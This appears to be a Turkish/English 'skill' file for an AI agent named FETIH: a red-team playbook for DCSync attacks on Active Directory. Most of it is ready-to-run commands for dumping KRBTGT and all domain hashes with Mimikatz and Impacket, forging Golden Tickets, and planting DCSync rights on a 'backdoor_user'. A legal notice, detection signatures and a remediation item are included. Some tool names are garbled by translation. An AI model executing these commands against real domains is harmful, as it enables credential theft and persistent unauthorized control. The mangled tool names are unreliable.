---
name: conducting-domain-persistence-with-dcsync
description: Perform DCSync attacks to replicate Active Directory credentials and establish domain persistence by extracting KRBTGT, Domain Admin, and service account hashes for Golden Ticket creation.
tags:
- golden-ticket
- persistence
- dcsync
- red-team
- mimikatz
- fetih
- credential-dumping
- cybersecurity
- red-teaming
- active-directory
- siber-güvenlik
triggers:
- adversary emulation
- api
- authentication
- conducting
- dcsync
- domain
- exploit
- hash
- incident
- kırmızı takım
- log
- network
category: red-team-operations
source_subdomain: red-teaming
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
adapted_for: fetih
---

# Conducting Domain Persistence with Dcsync


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Genel Bakış

DCSync is an attack technique that abuses the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to impersonate a Domain Controller and request password data from the target DC. The attack was introduced by Benjamin Delpy (Mimikatz author) and Vincent Le Toux, leveraging the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights. Any principal (user or computer) with these rights can replicate password hashes for any account in the domain, including the KRBTGT account. With the KRBTGT hash, attackers can forge Golden Tickets for indefinite domain persistence. DCSync is categorized as MITRE ATT&CK T1003.006 and is a critical post-exploitation technique used by APT groups including APT28 (Fancy Bear), APT29 (Cozy Bear), and FIN6.


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve conducting domain persistence with dcsync
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Familiarity with red teaming concepts and tools
- Erişim: a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Objectives

- Identify accounts with DCSync (replication) rights in Active Directory
- Perform DCSync using Mimikatz or Impacket's secretsdump.py
- Şunu çıkar: KRBTGT account hash for Golden Ticket creation
- Dump all domain user password hashes for credential analysis
- Forge Golden Tickets for persistent domain access
- Grant DCSync rights to a controlled account for alternative persistence
- Şunu belgele: attack chain and persistence mechanisms

## MITRE ATT&CK Mapping

- **T1003.006** - OS Credential Dumping: DCSync
- **T1558.001** - Steal or Forge Kerberos Tickets: Golden Ticket
- **T1222.001** - File and Directory Permissions Modification: Windows
- **T1098** - Account Manipulation
- **T1078.002** - Valid Accounts: Domain Accounts

## İş Akışı

### Aşama 1: Identify Accounts with DCSync Rights
1. Enumerate principals with replication rights:
   ```powershell
   # Using PowerView
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { ($_.ObjectAceType -match 'Replicating') -and
                    ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
     Select-Object SecurityIdentifier, ObjectAceType

   # Using BloodHound Cypher query
   MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
   RETURN u.name, d.name
   ```
2. Using Impacket's Bul:Delegation or custom LDAP query:
   ```bash
   # Check with Impacket
   Bul:Delegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1
   ```
3. Default accounts with DCSync rights:
   - Domain Admins
   - Enterprise Admins
   - Domain Controllers group
   - SYSTEM on Domain Controllers

### Aşama 2: DCSync Credential Extraction
1. Using Mimikatz (Windows):
   ```powershell
   # Dump specific account (KRBTGT for Golden Ticket)
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"

   # Dump Domain Admin
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"

   # Dump all domain accounts
   mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
   ```
2. Using Impacket secretsdump.py (Linux):
   ```bash
   # Dump all credentials
   secretsdump.py domain.local/admin:'Password123'@10.10.10.1

   # Dump specific user
   secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1

   # Dump only NTLM hashes (no Kerberos keys)
   secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1

   # Using Kerberos authentication
   export KRB5CCNAME=admin.ccache
   secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local
   ```

### Aşama 3: Golden Ticket Creation
1. Using Mimikatz with extracted KRBTGT hash:
   ```powershell
   # Create Golden Ticket
   mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> /ptt"

   # Create with specific group memberships
   mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> \
     /groups:512,513,518,519,520 /ptt"
   ```
2. Using Impacket ticketer.py (Linux):
   ```bash
   # Create Golden Ticket
   ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
     -domain domain.local administrator

   # Use the ticket
   export KRB5CCNAME=administrator.ccache
   psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
   ```

### Aşama 4: Persistence via DCSync Rights
1. Grant DCSync rights to a controlled account for persistence:
   ```powershell
   # Using PowerView - Add DS-Replication-Get-Changes-All rights
   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
     -PrincipalIdentity backdoor_user -Rights DCSync

   # Verify rights were added
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }
   ```
2. Using ntlmrelayx.py for automated DCSync rights escalation:
   ```bash
   # Relay authentication to add DCSync rights
   ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| Mimikatz | DCSync extraction, Golden Ticket creation | Windows |
| secretsdump.py | Remote DCSync (Impacket) | Linux (Python) |
| ticketer.py | Golden Ticket creation (Impacket) | Linux (Python) |
| PowerView | ACL enumeration and modification | Windows (PowerShell) |
| Rubeus | Kerberos ticket manipulation | Windows (.NET) |
| ntlmrelayx.py | DCSync rights escalation via relay | Linux (Python) |

## Critical Hashes to Extract

| Account | Purpose | Persistence Value |
|---------|---------|-------------------|
| krbtgt | Golden Ticket creation | Indefinite domain access |
| Administrator | Direct DA access | Immediate privileged access |
| Service accounts | Lateral movement | Service access across domain |
| Computer accounts | Silver Ticket creation | Service-level impersonation |

## Tespit Signatures

| Indicator | Tespit Method |
|-----------|-----------------|
| DrsGetNCChanges RPC calls from non-DC sources | Network monitoring for DRSUAPI traffic from unusual IPs |
| Event 4662 with Replicating Directory Changes GUIDs | Windows Security Log on DC (1131f6aa-/1131f6ad- GUIDs) |
| Event 4624 with Golden Ticket anomalies | Logon events with impossible SIDs or non-existent users |
| ACL modifications on domain root object | Event 5136 (directory service changes) |
| Replication traffic volume spike | Network baseline deviation monitoring |

## Doğrulama Criteria

- [ ] Accounts with DCSync rights enumerated
- [ ] KRBTGT hash extracted via DCSync
- [ ] All domain credentials dumped successfully
- [ ] Golden Ticket forged and validated for DA access
- [ ] DCSync rights persistence mechanism established (if in scope)
- [ ] Erişim: Domain Controller validated with Golden Ticket
- [ ] Evidence documented with hash values and timestamps
- [ ] Remediation recommendations provided (double KRBTGT reset, ACL audit)

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 32f282346bd701bf
-->

